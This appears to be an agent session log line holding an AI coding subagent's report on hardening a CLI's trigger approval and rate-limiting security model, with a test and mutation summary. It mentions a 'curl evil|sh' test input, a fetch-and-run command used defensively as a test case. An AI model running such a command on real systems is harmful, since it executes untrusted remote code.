{"type":"queue-operation","operation":"enqueue","timestamp":"2026-11-25T00:06:16.188Z","sessionId":"43bcbb67-2cff-4fa8-a05e-f8aa598df73b","content":"<task-notification>\n<task-id>aa38d8a5c723915de</task-id>\n<tool-use-id>toolu_01SLXDvFVQ9L6RK2yEgvGziz</tool-use-id>\n<output-file>/tmp/claude-1000/-home-mike-nexus-code/d25d0d24-8aed-4b03-a951-966dc54f0666/tasks/aa38d8a5c723915de.output</output-file>\n<status>completed</status>\n<summary>Agent \"Fix BG-3 trust model review blockers\" finished</summary>\n<note>A task-notification fires each time this agent stops with no live background children of its own. The user can send it another message and resume it, so the same task-id may notify more than once.</note>\n<result>All five blockers and the non-blocking items are fixed. I pushed commit `3e5ab8e95` to `origin/v1/bg3-trust-abuse-model`. Before it I merged `origin/release/v1.3.0` as `bfa8632fc`, and there were no foreign commits on the PR branch. HK-1's #805 has not landed, so the new protected path uses the relative style of `extension_trust.json`.\n\n**Blockers.** Source paths are under `cli/src`; tests under `cli/test`.\n1. `security.ts:174` adds `trigger_trust.json` to the protected paths. `trigger_self_approval.test.ts` (2 tests) covers it: with HOME as the workspace, write, edit, patch, delete and create are all refused. No limiter state file is persisted yet, so there is none to protect (see below).\n2. `triggers_cli.ts` `describeTriggerSpec` plus the approve action. It prints every field in full, with control and non-ASCII characters escaped. The prompt over 4,000 characters is cut with the \"[N more characters, not shown…]\" marker and approval is refused. The question is per trigger, shows the first 12 hex of its hash, and the prompt accepts only a literal `yes`. The `curl evil|sh` test is in `triggers_cli.test.ts`.\n3. `core/trigger_rate_limit.ts`: only admissions are recorded, as epoch-ms numbers, with binary-search windows. The limiter map holds 1,024 (LRU) and quarantines live in a separate map of 4,096 that survives eviction; when that map is full, new triggers are denied. Keys are workspace real path plus trigger id, and a changed rate takes effect on the next call. 6,000 attempts take about 7 ms.\n4. `TriggerRateLimiter.restore` and `WorkspaceRateLimiter.restore` validate every field. Any invalid one puts the limiter in operator-clear quarantine, and a bad container locks the whole limiter. There are 28 tamper cases.\n5. `WorkspaceRateLimiter.checkAndRecord` applies the workspace cap. A cap of 7 admits exactly 7 of 100 triggers, and a workspace-cap denial does not count toward a trigger's quarantine.\n\n**Mutations.** I tried 14 mutations on copies, and all were killed. They cover:\n- the protected-path entry removed;\n- the verifier or prompt truncated in the approve display;\n- skip-hash in the CLI list;\n- skipping a corrupt store entry;\n- the duplicate-id check and the spec-file mode check;\n- the workspace gate;\n- recording denials;\n- restore validation;\n- the LRU cap;\n- the rate update;\n- quarantine survival.\n\n**Non-blocking choices.**\n- **`release` command:** removed from the docs, not implemented. There is no persisted quarantine for it to clear until the firer exists. `WorkspaceRateLimiter.releaseQuarantine` is the hook it will call.\n- **Docs:** the example parses (a test checks it), the id rule matches the code, and the store key is described as the canonical hash of each spec. The faked-terminal limit is stated. Whether `--sandbox` can reach `~/.config/nexus` is stated as untested.\n- **Bad files:** a file with one bad spec or a duplicate id approves nothing.\n- **Spec file mode:** 0644 is accepted if you own the file and group and others cannot write it. Refusals name the mode and give `chmod go-w`.\n- **Workspace trust:** triggers use `isWorkspaceListed`, so `NEXUS_TRUST_WORKSPACE=1` does not count, and `status` says so.\n- **Secrets:** inline secrets need at least 16 characters, and `secretEnv` is implemented as the alternative.\n- **Dead code:** the duplicate `readTriggerTrustStore` in `trigger_spec.ts` is gone.\n\n**Counts.** The five trigger test files give 55, 24, 18, 21 and 2 passes, identical on three runs. The other required files pass: `security` 14, `workspace_trust` 5, `hooks_self_approval` 10, `leak_guard` 6, `check_requirements` 28, `protocol_schema` 8. `tsc` is clean, the complexity gate exits 0, and `check_invariants.mjs` and `check_doc_versions.mjs` both pass.\n\n**For the firer author.**\n- Use `WorkspaceRateLimiter.checkAndRecord(realWorkspace, id, specRate, now)`, after authentication and before the body is parsed.\n- Persist the limiter snapshot privately, and add that file to `DEFAULT_PROTECTED_PATHS`.\n- Treat a `false` return from `restore` as locked or quarantined.\n- Re-check trust at fire time.</result>\n<usage><subagent_tokens>182726</subagent_tokens><tool_uses>41</tool_uses><duration_ms>630127</duration_ms></usage>\n</task-notification>"}
